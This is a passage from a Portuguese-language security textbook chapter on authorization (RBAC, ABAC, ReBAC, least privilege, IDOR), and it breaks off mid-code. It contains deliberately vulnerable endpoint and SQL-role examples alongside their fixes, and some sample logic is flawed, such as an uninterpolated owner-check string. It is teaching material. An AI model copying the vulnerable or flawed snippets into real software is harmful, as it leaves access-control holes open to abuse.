# Capitulo 8 -- Autorizacao e Controle de Acesso

> "Autenticacao resolve quem voce e. Autorizacao resolve o que voce pode fazer. Muitos sistemas falham porque tratam autenticacao como se autorizacao viesse gratis."

---

## Objetivos de Aprendizado

Ao final deste capitulo, voce sera capaz de:

1. **Distinguir e implementar modelos de autorizacao** -- RBAC, ABAC e ReBAC -- compreendendo seus trade-offs e quando usar cada um em aplicacoes web modernas.
2. **Aplicar o principio do menor privilegio** em todas as camadas da arquitetura, desde permissoes de banco de dados ate endpoints de API.
3. **Identificar e prevenir Insecure Direct Object References (IDOR)**, incluindo tecnicas de teste e padroes de design que eliminam a classe inteira de vulnerabilidades.
4. **Detectar e bloquear path traversal e file inclusion** em servidores web, frameworks e APIs.
5. **Implementar middleware de autorizacao robusto** em Express.js e Go, incluindo padroes como policy-as-code e cascata de permissoes.
6. **Configurar row-level security (RLS)** em PostgreSQL e bancos modernos para protecao em nivel de registro.
7. **Projetar autorizacao multi-tenant** com isolamento adequado entre tenants.
8. **Utilizar ferramentas de autorizacao distribuida** como OPA, Casbin e Cedar em arquiteturas de microservicos.
9. **Extrair e validar claims de JWT para autorizacao** com seguranca, evitando confusao e manipulacao.
10. **Implementar autorizacao em GraphQL** com controle em nivel de campo e protecao contra query complexity attacks.

---

## 8.1 Modelos de Autorizacao: RBAC, ABAC e ReBAC

Autorizacao e o processo de determinar se uma entidade autenticada tem permissao para realizar uma acao especifica sobre um recurso especifico. Enquanto autenticacao e relativamente padronizada (OAuth, OIDC, SAML), autorizacao e dominio onde a maioria dos sistemas produz solucoes ad-hoc, fragilmente acopladas e dificeis de auditar.

### 8.1.1 RBAC -- Role-Based Access Control

RBAC e o modelo de autorizacao mais amplamente adotado. Em RBAC, os usuarios sao atribuidos a roles, e roles sao atribuidas a permissoes. O usuario herda todas as permissoes da role.

**Conceitos fundamentais:**

| Conceito | Definicao | Exemplo |
|----------|-----------|---------|
| **User** | Entidade autenticada | joao@empresa.com |
| **Role** | Conjunto de permissoes | admin, editor, viewer |
| **Permission** | Capacidade de executar uma acao | articles:create, articles:delete |
| **Constraint** | Regra que limita atribuicao | Um usuario so pode ter 1 role por tenant |

**Arquitetura basica de RBAC:**

```
+-----------+       +-----------+       +--------------+
|   User    |---M:N-|   Role    |---M:N-|  Permission  |
+-----------+       +-----------+       +--------------+
      |                   |
      |              +-----------+
      |              |  Scope    |
      |              +-----------+
      |
+-----------+
|  Tenant   |
+-----------+
```

**Implementacao basica em TypeScript:**

```typescript
// Core RBAC types
interface Permission {
  id: string;
  resource: string;
  action: string;
  scope?: string;
}

interface Role {
  id: string;
  name: string;
  permissions: Permission[];
  constraints?: RoleConstraint[];
}

interface RoleConstraint {
  type: 'max_users' | 'time_bound' | 'scope_limit' | 'mutual_exclusion';
  value: string | number;
}

interface User {
  id: string;
  email: string;
  roles: UserRole[];
}

interface UserRole {
  roleId: string;
  tenantId?: string;
  grantedAt: Date;
  grantedBy: string;
  expiresAt?: Date;
}

class RBACEngine {
  private roles: Map<string, Role> = new Map();
  private users: Map<string, User> = new Map();

  constructor() {
    this.seedDefaultRoles();
  }

  private seedDefaultRoles(): void {
    this.roles.set('admin', {
      id: 'admin',
      name: 'Administrator',
      permissions: [
        { id: 'perm-1', resource: '*', action: '*' },
      ],
    });

    this.roles.set('editor', {
      id: 'editor',
      name: 'Editor',
      permissions: [
        { id: 'perm-2', resource: 'articles', action: 'create' },
        { id: 'perm-3', resource: 'articles', action: 'read' },
        { id: 'perm-4', resource: 'articles', action: 'update' },
        { id: 'perm-5', resource: 'articles', action: 'publish' },
        { id: 'perm-6', resource: 'comments', action: 'moderate' },
      ],
    });

    this.roles.set('viewer', {
      id: 'viewer',
      name: 'Viewer',
      permissions: [
        { id: 'perm-7', resource: 'articles', action: 'read' },
        { id: 'perm-8', resource: 'comments', action: 'create' },
      ],
    });
  }

  hasPermission(userId: string, resource: string, action: string, tenantId?: string): boolean {
    const user = this.users.get(userId);
    if (!user) return false;

    for (const userRole of user.roles) {
      if (userRole.expiresAt && userRole.expiresAt < new Date()) {
        continue;
      }

      if (tenantId && userRole.tenantId && userRole.tenantId !== tenantId) {
        continue;
      }

      const role = this.roles.get(userRole.roleId);
      if (!role) continue;

      for (const perm of role.permissions) {
        if (perm.resource === '*' || perm.resource === resource) {
          if (perm.action === '*' || perm.action === action) {
            return true;
          }
        }
      }
    }

    return false;
  }

  assignRole(userId: string, roleId: string, tenantId?: string, grantedBy?: string): boolean {
    const user = this.users.get(userId);
    const role = this.roles.get(roleId);

    if (!user || !role) return false;

    if (role.constraints) {
      for (const constraint of role.constraints) {
        if (!this.validateConstraint(userId, constraint, tenantId)) {
          return false;
        }
      }
    }

    user.roles.push({
      roleId,
      tenantId,
      grantedAt: new Date(),
      grantedBy: grantedBy || 'system',
    });

    return true;
  }

  private validateConstraint(userId: string, constraint: RoleConstraint, tenantId?: string): boolean {
    switch (constraint.type) {
      case 'mutual_exclusion': {
        const user = this.users.get(userId);
        if (!user) return false;
        const hasConflicting = user.roles.some(ur => ur.roleId === constraint.value);
        return !hasConflicting;
      }
      case 'max_users': {
        const maxUsers = constraint.value as number;
        let count = 0;
        for (const u of this.users.values()) {
          if (u.roles.some(ur => ur.roleId === tenantId)) count++;
        }
        return count < maxUsers;
      }
      default:
        return true;
    }
  }

  revokeRole(userId: string, roleId: string, tenantId?: string): boolean {
    const user = this.users.get(userId);
    if (!user) return false;

    const initialLength = user.roles.length;
    user.roles = user.roles.filter(ur => {
      if (ur.roleId !== roleId) return true;
      if (tenantId && ur.tenantId !== tenantId) return true;
      return false;
    });

    return user.roles.length < initialLength;
  }

  listPermissions(userId: string, tenantId?: string): Permission[] {
    const user = this.users.get(userId);
    if (!user) return [];

    const permissions: Permission[] = [];
    const seen = new Set<string>();

    for (const userRole of user.roles) {
      if (userRole.expiresAt && userRole.expiresAt < new Date()) continue;
      if (tenantId && userRole.tenantId && userRole.tenantId !== tenantId) continue;

      const role = this.roles.get(userRole.roleId);
      if (!role) continue;

      for (const perm of role.permissions) {
        const key = `${perm.resource}:${perm.action}`;
        if (!seen.has(key)) {
          seen.add(key);
          permissions.push(perm);
        }
      }
    }

    return permissions;
  }
}
```

**Vantagens do RBAC:**
- Simples de entender e implementar
- Escalavel para organizacoes com hierarquias claras
- Facil de auditar (quem tem que role?)
- Suporte nativo em muitas frameworks

**Limitacoes do RBAC:**
- Rigido para cenarios contextuais (hora do dia, localizacao, tipo de dispositivo)
- Explosao combinatoria quando muitos roles sao necessarios
- Dificil de expressar relacoes entre recursos ("usuarios podem ver apenas seus proprios pedidos")
- Atualizacao de permissoes requer reavaliacao de todas as roles

### 8.1.2 ABAC -- Attribute-Based Access Control

ABAC usa atributos (propriedades) de quatro categorias para tomar decisoes de autorizacao:

1. **Subject attributes**: Propriedades do usuario (cargo, departamento, clearance)
2. **Object attributes**: Propriedades do recurso (proprietario, classificacao, categoria)
3. **Action attributes**: Propriedades da acao (tipo, urgencia, modo)
4. **Environment attributes**: Propriedades do contexto (hora, IP, dispositivo, pais)

**Arquitetura ABAC:**

```
+------------------+     +------------------+
|  Policy Decision |<----|  Policy Info     |
|  Point (PDP)     |     |  Point (PIP)     |
+--------+---------+     +------------------+
         |
         |  Permit / Deny
         |
+--------v---------+
|  Policy Enforce  |
|  Point (PEP)     |
+------------------+
         ^
         |
  Request from Subject
```

**Implementacao ABAC em TypeScript:**

```typescript
interface SubjectAttributes {
  userId: string;
  role: string;
  department: string;
  clearanceLevel: number;
  mfaVerified: boolean;
  lastLoginIp: string;
}

interface ObjectAttributes {
  resourceId: string;
  resourceType: string;
  ownerId: string;
  classification: 'public' | 'internal' | 'confidential' | 'secret';
  department: string;
  tags: string[];
}

interface ActionAttributes {
  actionType: string;
  isDestructive: boolean;
  requiresApproval: boolean;
}

interface EnvironmentAttributes {
  timestamp: Date;
  clientIp: string;
  userAgent: string;
  deviceType: 'mobile' | 'desktop' | 'tablet' | 'api';
  location?: {
    country: string;
    region: string;
  };
}

interface AccessRequest {
  subject: SubjectAttributes;
  object: ObjectAttributes;
  action: ActionAttributes;
  environment: EnvironmentAttributes;
}

interface PolicyRule {
  id: string;
  description: string;
  priority: number;
  effect: 'permit' | 'deny';
  conditions: PolicyCondition[];
}

interface PolicyCondition {
  target: 'subject' | 'object' | 'action' | 'environment';
  attribute: string;
  operator: 'equals' | 'not_equals' | 'in' | 'not_in' |
            'greater_than' | 'less_than' | 'contains' |
            'starts_with' | 'regex' | 'exists';
  value: any;
}

class ABACEngine {
  private policies: PolicyRule[] = [];

  addPolicy(policy: PolicyRule): void {
    this.policies.push(policy);
    this.policies.sort((a, b) => b.priority - a.priority);
  }

  evaluate(request: AccessRequest): { decision: 'permit' | 'deny'; reason: string; matchedPolicy?: string } {
    for (const policy of this.policies) {
      const allConditionsMet = policy.conditions.every(condition =>
        this.evaluateCondition(request, condition)
      );

      if (allConditionsMet) {
        return {
          decision: policy.effect,
          reason: policy.description,
          matchedPolicy: policy.id,
        };
      }
    }

    return { decision: 'deny', reason: 'No matching policy found -- default deny' };
  }

  private evaluateCondition(request: AccessRequest, condition: PolicyCondition): boolean {
    const value = this.getAttributeValue(request, condition.target, condition.attribute);

    if (value === undefined) {
      return condition.operator === 'not_equals' && condition.value === undefined;
    }

    switch (condition.operator) {
      case 'equals':
        return value === condition.value;
      case 'not_equals':
        return value !== condition.value;
      case 'in':
        return Array.isArray(condition.value) && condition.value.includes(value);
      case 'not_in':
        return Array.isArray(condition.value) && !condition.value.includes(value);
      case 'greater_than':
        return value > condition.value;
      case 'less_than':
        return value < condition.value;
      case 'contains':
        return typeof value === 'string' && value.includes(condition.value);
      case 'starts_with':
        return typeof value === 'string' && value.startsWith(condition.value);
      case 'regex':
        return typeof value === 'string' && new RegExp(condition.value).test(value);
      case 'exists':
        return value !== undefined && value !== null;
      default:
        return false;
    }
  }

  private getAttributeValue(request: AccessRequest, target: string, attribute: string): any {
    const targetMap: Record<string, any> = {
      subject: request.subject,
      object: request.object,
      action: request.action,
      environment: request.environment,
    };

    const targetObj = targetMap[target];
    if (!targetObj) return undefined;

    const parts = attribute.split('.');
    let current: any = targetObj;

    for (const part of parts) {
      if (current === null || current === undefined) return undefined;
      current = current[part];
    }

    return current;
  }
}
```

**Exemplo de politica ABAC para acesso a documentos:**

```typescript
const engine = new ABACEngine();

// Regra 1: Negar acesso a documentos secretos para usuarios sem clearance suficiente
engine.addPolicy({
  id: 'deny-secret-low-clearance',
  description: 'Users with clearance below 3 cannot access secret documents',
  priority: 100,
  effect: 'deny',
  conditions: [
    { target: 'object', attribute: 'classification', operator: 'equals', value: 'secret' },
    { target: 'subject', attribute: 'clearanceLevel', operator: 'less_than', value: 3 },
  ],
});

// Regra 2: Permitir acesso ao proprio documento
engine.addPolicy({
  id: 'allow-owner-access',
  description: 'Document owners can always access their own documents',
  priority: 90,
  effect: 'permit',
  conditions: [
    { target: 'subject', attribute: 'userId', operator: 'equals', value: '${object.ownerId}' },
  ],
});

// Regra 3: Negar operacoes destrutivas sem MFA
engine.addPolicy({
  id: 'require-mfa-destructive',
  description: 'Destructive operations require MFA',
  priority: 80,
  effect: 'deny',
  conditions: [
    { target: 'action', attribute: 'isDestructive', operator: 'equals', value: true },
    { target: 'subject', attribute: 'mfaVerified', operator: 'equals', value: false },
  ],
});

// Regra 4: Negar acesso de dispositivos moveis a dados confidenciais
engine.addPolicy({
  id: 'deny-mobile-confidential',
  description: 'Mobile devices cannot access confidential data',
  priority: 70,
  effect: 'deny',
  conditions: [
    { target: 'environment', attribute: 'deviceType', operator: 'equals', value: 'mobile' },
    { target: 'object', attribute: 'classification', operator: 'in', value: ['confidential', 'secret'] },
  ],
});
```

### 8.1.3 ReBAC -- Relationship-Based Access Control

ReBAC modela autorizacao como relacoes entre entidades. E particularmente eficaz para sistemas sociais, colaborativos e com grafos complexos de relacionamento.

**Conceitos centrais do ReBAC:**

- **Nós**: Entidades (usuarios, documentos, projetos, organizacoes)
- **Arestas**: Relacoes entre entidades (owner_of, member_of, can_edit, inherited_from)
- **Cadeias**: Caminhos no grafo que conectam sujeito a recurso

**Exemplo de modelo de relacoes:**

```
user:joao --[member_of]--> team:eng
team:eng --[member_of]--> org:acme
org:acme --[owns]--> project:secret-project
project:secret-project --[contains]--> document:design-doc

user:maria --[owner_of]--> document:design-doc
user:maria --[member_of]--> team:design
```

**Implementacao ReBAC em TypeScript:**

```typescript
interface Relationship {
  subject: string;
  relation: string;
  object: string;
  metadata?: {
    createdAt: Date;
    expiresAt?: Date;
    grantedBy?: string;
  };
}

interface RelationshipQuery {
  subject: string;
  relation: string;
  object: string;
}

class RelationshipTuple {
  constructor(
    public readonly subject: string,
    public readonly relation: string,
    public readonly object: string,
    public readonly metadata?: {
      createdAt: Date;
      expiresAt?: Date;
      grantedBy?: string;
    }
  ) {}

  toString(): string {
    return `${this.subject}#${this.relation}@${this.object}`;
  }
}

class ReBACEngine {
  private relationships: RelationshipTuple[] = [];
  private userRewrites: Map<string, { userSet: string; computedUserset: string }> = new Map();

  addRelationship(rel: RelationshipTuple): void {
    this.relationships.push(rel);
  }

  removeRelationship(subject: string, relation: string, object: string): void {
    this.relationships = this.relationships.filter(
      r => !(r.subject === subject && r.relation === relation && r.object === object)
    );
  }

  addComputedUsersetRewrite(
    subjectRelation: string,
    objectRelation: string,
    computedRelation: string
  ): void {
    this.userRewrites.set(`${subjectRelation}@${objectRelation}`, {
      userSet: subjectRelation,
      computedUserset: computedRelation,
    });
  }

  check(query: RelationshipQuery): boolean {
    const visited = new Set<string>();
    return this.checkRecursive(query.subject, query.relation, query.object, visited, 0);
  }

  private checkRecursive(
    subject: string,
    relation: string,
    object: string,
    visited: Set<string>,
    depth: number
  ): boolean {
    if (depth > 20) return false;

    const key = `${subject}#${relation}@${object}`;
    if (visited.has(key)) return false;
    visited.add(key);

    const directMatch = this.relationships.some(
      r => r.subject === subject &&
           r.relation === relation &&
           r.object === object &&
           (!r.metadata?.expiresAt || r.metadata.expiresAt > new Date())
    );

    if (directMatch) return true;

    for (const rel of this.relationships) {
      if (rel.subject === subject && rel.object === object && rel.relation !== relation) {
        if (this.inheritsRelation(rel.relation, relation)) {
          if (this.checkRecursive(subject, rel.relation, object, visited, depth + 1)) {
            return true;
          }
        }
      }
    }

    for (const rel of this.relationships) {
      if (rel.subject === subject && rel.relation === relation && rel.object !== object) {
        const isOwner = this.relationships.some(
          r => r.subject === rel.object && r.relation === 'owner_of' && r.object === object
        );
        if (isOwner) return true;
      }
    }

    const memberOfGroups = this.relationships.filter(
      r => r.subject === subject && r.relation === 'member_of'
    );

    for (const groupRel of memberOfGroups) {
      if (this.checkRecursive(groupRel.object, relation, object, visited, depth + 1)) {
        return true;
      }
    }

    return false;
  }

  private inheritsRelation(childRelation: string, parentRelation: string): boolean {
    const hierarchy: Record<string, string[]> = {
      'owner_of': ['can_read', 'can_write', 'can_delete', 'can_share'],
      'can_write': ['can_read'],
      'admin_of': ['can_read', 'can_write', 'can_delete', 'can_share', 'can_admin'],
      'member_of': ['can_read'],
      'collaborator_of': ['can_read', 'can_write'],
    };

    return hierarchy[childRelation]?.includes(parentRelation) ?? false;
  }

  listAccessibleObjects(subject: string, relation: string): string[] {
    const accessible = new Set<string>();

    for (const rel of this.relationships) {
      if (rel.subject === subject && rel.relation === relation) {
        accessible.add(rel.object);
      }
    }

    const memberOfGroups = this.relationships.filter(
      r => r.subject === subject && r.relation === 'member_of'
    );

    for (const groupRel of memberOfGroups) {
      const groupObjects = this.listAccessibleObjects(groupRel.object, relation);
      for (const obj of groupObjects) {
        accessible.add(obj);
      }
    }

    return Array.from(accessible);
  }
}
```

### 8.1.4 Comparacao dos Modelos

| Caracteristica | RBAC | ABAC | ReBAC |
|---------------|------|------|-------|
| **Complexidade de implementacao** | Baixa | Alta | Media |
| **Granularidade** | Media | Alta | Alta |
| **Performance** | Alta | Media | Media-Baixa |
| **Escalabilidade** | Limitada por numero de roles | Muito alta | Depende do grafo |
| **Auditabilidade** | Alta | Media | Baixa |
| **Cenarios ideais** | Hierarquias organizacionais | Contextos dinamicos | Sistemas colaborativos |
| **Manutencao** | Simples | Complexa | Media |

### 8.1.5 Hibridos: Combinando Modelos

Na pratica, muitos sistemas combinam modelos. Uma abordagem comum e usar RBAC para permissoes grosseiras e ABAC ou ReBAC para refinamento contextual:

```typescript
class HybridAuthorizationEngine {
  private rbac: RBACEngine;
  private abac: ABACEngine;
  private rebac: ReBACEngine;

  async authorize(
    userId: string,
    resource: string,
    action: string,
    context?: {
      tenantId?: string;
      clientIp?: string;
      deviceType?: string;
      timestamp?: Date;
    }
  ): Promise<{ allowed: boolean; reason: string }> {
    // Step 1: RBAC coarse-grained check
    const rbacResult = this.rbac.hasPermission(userId, resource, action, context?.tenantId);
    if (!rbacResult) {
      return { allowed: false, reason: 'RBAC denied -- insufficient role permissions' };
    }

    // Step 2: ReBAC relationship check (if resource has ownership)
    const rebacCheck = this.rebac.check({
      subject: `user:${userId}`,
      relation: action === 'read' ? 'can_read' : action === 'write' ? 'can_write' : 'can_delete',
      object: resource,
    });

    if (!rebacCheck) {
      return { allowed: false, reason: 'ReBAC denied -- no valid relationship path' };
    }

    // Step 3: ABAC contextual refinement
    if (context) {
      const abacRequest: AccessRequest = {
        subject: {
          userId,
          role: this.rbac.getUserRole(userId),
          department: '',
          clearanceLevel: 2,
          mfaVerified: true,
          lastLoginIp: context.clientIp || '',
        },
        object: {
          resourceId: resource,
          resourceType: resource.split(':')[0],
          ownerId: '',
          classification: 'internal',
          department: '',
          tags: [],
        },
        action: {
          actionType: action,
          isDestructive: action === 'delete',
          requiresApproval: false,
        },
        environment: {
          timestamp: context.timestamp || new Date(),
          clientIp: context.clientIp || '',
          userAgent: '',
          deviceType: (context?.deviceType as any) || 'desktop',
        },
      };

      const abacResult = this.abac.evaluate(abacRequest);
      if (abacResult.decision === 'deny') {
        return { allowed: false, reason: `ABAC denied: ${abacResult.reason}` };
      }
    }

    return { allowed: true, reason: 'All authorization checks passed' };
  }
}
```

### 8.1.6 Estudo de Caso: GitHub Permissions Model

GitHub implementa um modelo hibrido sofisticado que combina RBAC em nivel de organizacao com ReBAC em nivel de repositorio e ABAC para protecao de branches.

**Hierarquia de permissoes no GitHub:**

| Nivel | Roles | Exemplo |
|-------|-------|---------|
| Organizacao | Owner, Member, Outside Collaborator | Equipe da empresa |
| Time | Member | time-backend, team-frontend |
| Repositorio | Admin, Write, Read, Triage | Repositorio especifico |
| Branch | Branch protection rules | main branch |

**Modelo de branch protection (ABAC):**

```typescript
interface BranchProtectionRule {
  branchPattern: string;
  requirePullRequest: boolean;
  requiredApprovals: number;
  dismissStaleReviews: boolean;
  requireStatusChecks: boolean;
  requiredStatusChecks: string[];
  requireSignedCommits: boolean;
  restrictPushes: {
    enabled: boolean;
    allowedTeams: string[];
    allowedUsers: string[];
  };
  requireLinearHistory: boolean;
  allowForcePushes: boolean;
  allowDeletions: boolean;
}

function evaluateBranchProtection(
  rule: BranchProtectionRule,
  pusher: User,
  branch: string,
  hasApprovedReviews: boolean,
  statusChecksPass: boolean,
  commitSigned: boolean
): { allowed: boolean; reasons: string[] } {
  const reasons: string[] = [];

  if (!new RegExp(rule.branchPattern.replace('*', '.*')).test(branch)) {
    return { allowed: true, reasons: [] };
  }

  if (rule.requirePullRequest && !hasApprovedReviews) {
    reasons.push('Pull request with required approvals is mandatory');
  }

  if (rule.requireStatusChecks && !statusChecksPass) {
    reasons.push(`Required status checks must pass: ${rule.requiredStatusChecks.join(', ')}`);
  }

  if (rule.requireSignedCommits && !commitSigned) {
    reasons.push('Commits must be signed');
  }

  if (rule.restrictPushes.enabled) {
    const isAllowed =
      rule.restrictPushes.allowedUsers.includes(pusher.id) ||
      rule.restrictPushes.allowedTeams.some(team =>
        pusher.teams.includes(team)
      );

    if (!isAllowed) {
      reasons.push('Push restricted to allowed teams/users');
    }
  }

  return { allowed: reasons.length === 0, reasons };
}
```

---

## 8.2 Principio do Menor Privilegio

O principio do menor privilegio (Principle of Least Privilege -- PoLP) e um dos pilares fundamentais da seguranca da informacao. Cada entidade (usuario, servico, processo, sistema) deve ter apenas os privilegios minimos necessarios para realizar sua funcao, e nao mais.

### 8.2.1 Por que o Menor Privilegio Importa

Quando um sistema viola o principio do menor privilegio, uma simples falha de autenticacao ou uma vulnerabilidade de injecao pode escalar para acesso total. O ataque mais devastador nao e o que explora uma vulnerabilidade critica -- e o que explora uma vulnerabilidade trivial em um contexto com privilegios excessivos.

**Exemplo real -- Capital One (2019):**

```
Vetor de ataque:
1. SSRF em um servico web (vulnerabilidade media)
2. Servico executava com role IAM excessivamente permissiva
3. Acesso ao S3 bucket com dados de 100M+ de clientes
4. Tokens temporarios AWS roubados via metadata endpoint

Se o servico tivesse privilegios minimos:
- Acesso S3 restrito a apenas os buckets necessarios
- Sem acesso a credenciais de outros servicos
- Metadata endpoint restrito ou auditado
```

### 8.2.2 Implementacao em Cada Camada

**Aplicacao Web:**

```typescript
// VIOLACAO do menor privilegio -- servico com acesso irrestrito ao banco
class UserRepository {
  constructor(private db: Database) {}

  async findAll(): Promise<User[]> {
    return this.db.query('SELECT * FROM users');
  }

  async updatePassword(userId: string, newPassword: string): Promise<void> {
    await this.db.query('UPDATE users SET password = $1 WHERE id = $2', [newPassword, userId]);
  }
}

// CORRECAO -- servico com acesso minimo necessario
class UserRepository {
  constructor(private db: RestrictedDatabase) {}

  async findPublicProfile(userId: string): Promise<PublicUserProfile | null> {
    return this.db.query(
      'SELECT id, name, avatar_url, bio FROM users WHERE id = $1 AND deleted_at IS NULL',
      [userId]
    );
  }

  async updatePassword(userId: string, hashedPassword: string): Promise<void> {
    await this.db.query(
      'UPDATE users SET password_hash = $1, password_updated_at = NOW() WHERE id = $2 AND deleted_at IS NULL',
      [hashedPassword, userId]
    );
  }

  async deleteAccount(userId: string): Promise<void> {
    await this.db.query(
      'UPDATE users SET deleted_at = NOW(), email = CONCAT(id, @deleted_suffix) WHERE id = $1',
      [userId]
    );
  }
}
```

**Banco de Dados:**

```sql
-- VIOLACAO: role com acesso total
CREATE ROLE app_service WITH LOGIN PASSWORD 'secure_password';
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO app_service;
GRANT ALL PRIVILEGES ON ALL SEQUENCES IN SCHEMA public TO app_service;

-- CORRECAO: roles minimas por servico
CREATE ROLE app_readonly WITH LOGIN PASSWORD 'readonly_password';
GRANT CONNECT ON DATABASE myapp TO app_readonly;
GRANT USAGE ON SCHEMA public TO app_readonly;
GRANT SELECT ON users, orders, products TO app_readonly;

CREATE ROLE app_orders WITH LOGIN PASSWORD 'orders_password';
GRANT CONNECT ON DATABASE myapp TO app_orders;
GRANT USAGE ON SCHEMA public TO app_orders;
GRANT SELECT, INSERT, UPDATE ON orders, order_items TO app_orders;
GRANT SELECT ON users TO app_orders;

CREATE ROLE app_admin WITH LOGIN PASSWORD 'admin_password';
GRANT CONNECT ON DATABASE myapp TO app_admin;
GRANT USAGE ON SCHEMA public TO app_admin;
GRANT SELECT, INSERT, UPDATE, DELETE ON users TO app_admin;
GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO app_admin;
```

**Infraestrutura / IAM:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowSpecificS3Bucket",
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:PutObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::myapp-uploads-${aws:PrincipalTag/Environment}",
        "arn:aws:s3:::myapp-uploads-${aws:PrincipalTag/Environment}/*"
      ]
    },
    {
      "Sid": "AllowKMSForUploads",
      "Effect": "Allow",
      "Action": [
        "kms:Decrypt",
        "kms:GenerateDataKey"
      ],
      "Resource": "arn:aws:kms:us-east-1:123456789:key/key-id",
      "Condition": {
        "StringEquals": {
          "kms:ViaService": "s3.us-east-1.amazonaws.com"
        }
      }
    }
  ]
}
```

### 8.2.3 Auditoria de Privilegios

Periodicamente, todo sistema deve passar por uma auditoria de privilegios:

```typescript
interface PrivilegeAuditEntry {
  entity: string;
  entityType: 'user' | 'service' | 'role' | 'group';
  resource: string;
  permission: string;
  grantedAt: Date;
  lastUsed?: Date;
  usageCount: number;
  riskLevel: 'low' | 'medium' | 'high' | 'critical';
  recommendation?: string;
}

class PrivilegeAuditor {
  async audit(): Promise<PrivilegeAuditEntry[]> {
    const entries: PrivilegeAuditEntry[] = [];

    // Check for unused permissions
    const allPermissions = await this.getAllPermissions();
    for (const perm of allPermissions) {
      if (!perm.lastUsed || perm.lastUsed < this.daysAgo(90)) {
        entries.push({
          ...perm,
          riskLevel: 'medium',
          recommendation: 'Permission unused for 90+ days -- consider revoking',
        });
      }
    }

    // Check for overly broad permissions
    const broadPermissions = allPermissions.filter(
      p => p.permission === '*' || p.resource === '*'
    );
    for (const perm of broadPermissions) {
      entries.push({
        ...perm,
        riskLevel: 'high',
        recommendation: 'Wildcard permission -- scope down to specific resources',
      });
    }

    // Check for permissions without MFA
    const nonMfaUsers = await this.getUsersWithoutMFAWithPermissions();
    for (const user of nonMfaUsers) {
      entries.push({
        entity: user.email,
        entityType: 'user',
        resource: '*',
        permission: user.permissions.join(', '),
        grantedAt: user.permissionGrantedAt,
        lastUsed: user.lastLogin,
        usageCount: 0,
        riskLevel: 'critical',
        recommendation: 'User has admin permissions without MFA -- enforce MFA immediately',
      });
    }

    return entries;
  }

  private daysAgo(days: number): Date {
    const date = new Date();
    date.setDate(date.getDate() - days);
    return date;
  }
}
```

---

## 8.3 Insecure Direct Object References (IDOR)

IDOR e uma vulnerabilidade onde a aplicacao expoe referencias diretas a objetos internos (IDs de banco de dados, caminhos de arquivo, nomes de usuario) sem verificar se o usuario autenticado tem permissao para acessar aquele objeto especifico.

### 8.3.1 Como IDOR Funciona

O padrao basico de IDOR e previsivel:

```
Usuario A (ID: 1001) acessa: GET /api/orders/1001
Servico retorna: { "orderId": 1001, "total": 250.00, "items": [...] }

Usuario B (ID: 1002) acessa: GET /api/orders/1001
Servico retorna: { "orderId": 1001, "total": 250.00, "items": [...] }

PROBLEMA: Usuario B nao deveria ver o pedido 1001, mas o servico nao verifica a ownership.
```

### 8.3.2 Variantes de IDOR

**IDOR em APIs REST:**

```typescript
// VULNERAVEL: Sem verificacao de ownership
app.get('/api/invoices/:id', authenticate, async (req, res) => {
  const invoice = await db.invoices.findById(req.params.id);
  if (!invoice) {
    return res.status(404).json({ error: 'Invoice not found' });
  }
  // PROBLEMA: qualquer usuario autenticado pode ver qualquer fatura
  res.json(invoice);
});

// SEGURO: Verificacao de ownership
app.get('/api/invoices/:id', authenticate, async (req, res) => {
  const invoice = await db.invoices.findById(req.params.id);
  if (!invoice) {
    return res.status(404).json({ error: 'Invoice not found' });
  }

  if (invoice.userId !== req.user.id && !req.user.hasRole('admin')) {
    return res.status(403).json({ error: 'Access denied' });
  }

  res.json(invoice);
});
```

**IDOR em downloads de arquivo:**

```python
# VULNERAVEL: Path traversal + IDOR
@app.route('/api/documents/<int:doc_id>/download')
@login_required
def download_document(doc_id):
    doc = Document.query.get_or_404(doc_id)
    # PROBLEMA: qualquer usuario autenticado pode baixar qualquer documento
    return send_file(doc.file_path, as_attachment=True)

# SEGURO: Verificacao de ownership + permissao
@app.route('/api/documents/<int:doc_id>/download')
@login_required
def download_document(doc_id):
    doc = Document.query.get_or_404(doc_id)
    if doc.owner_id != current_user.id and not current_user.has_permission('documents:read:all'):
        abort(403)
    return send_file(doc.file_path, as_attachment=True)
```

**IDOR em APIs GraphQL:**

```graphql
# VULNERAVEL: Query sem verificacao de ownership
type Query {
  user(id: ID!): User
  invoice(id: ID!): Invoice
}

# SEGURO: Resolver com verificacao
type Query {
  me: User
  myInvoices: [Invoice!]!
}
```

### 8.3.3 Tecnicas de Prevencao

**Padrao 1: UUIDs em vez de IDs sequenciais**

```typescript
// IDs sequenciais sao previsiveis e facilitam enumeration
// GET /api/users/1 -> /api/users/2 -> /api/users/3...

// UUIDs sao imprevisiveis
import { v4 as uuidv4 } from 'uuid';

interface Order {
  id: string;        // UUID: "550e8400-e29b-41d4-a716-446655440000"
  userId: string;
  total: number;
}

// Mesmo com UUIDs, ownership verification e obrigatoria
// UUIDs dificultam, mas NAO eliminam IDOR
```

**Padrao 2: Middleware de verificacao de ownership**

```typescript
function requireOwnership(resourceType: string, ownershipField: string = 'userId') {
  return async (req: Request, res: Response, next: NextFunction) => {
    const resourceId = req.params.id;
    const userId = req.user.id;
    const isAdmin = req.user.roles.includes('admin');

    if (isAdmin) {
      return next();
    }

    const resource = await db[resourceType].findById(resourceId);
    if (!resource) {
      return res.status(404).json({ error: 'Resource not found' });
    }

    if (resource[ownershipField] !== userId) {
      return res.status(403).json({ error: 'Access denied' });
    }

    req.resource = resource;
    next();
  };
}

// Uso
app.get('/api/orders/:id', authenticate, requireOwnership('orders'), getOrder);
app.put('/api/orders/:id', authenticate, requireOwnership('orders'), updateOrder);
app.delete('/api/orders/:id', authenticate, requireOwnership('orders'), deleteOrder);
```

**Padrao 3: UUIDs opaque com tokens de acesso**

```typescript
// Cada documento tem um token de acesso unico
interface Document {
  id: string;
  ownerId: string;
  accessTokens: DocumentAccessToken[];
}

interface DocumentAccessToken {
  token: string;
  userId: string;
  permissions: string[];
  expiresAt: Date;
  createdAt: Date;
}

// Acesso via token, nao via ID
app.get('/api/documents/access/:token', async (req, res) => {
  const doc = await db.documents.findByAccessToken(req.params.token);
  if (!doc) {
    return res.status(404).json({ error: 'Document not found' });
  }

  const token = doc.accessTokens.find(t => t.token === req.params.token);
  if (!token || token.expiresAt < new Date()) {
    return res.status(403).json({ error: 'Access denied' });
  }

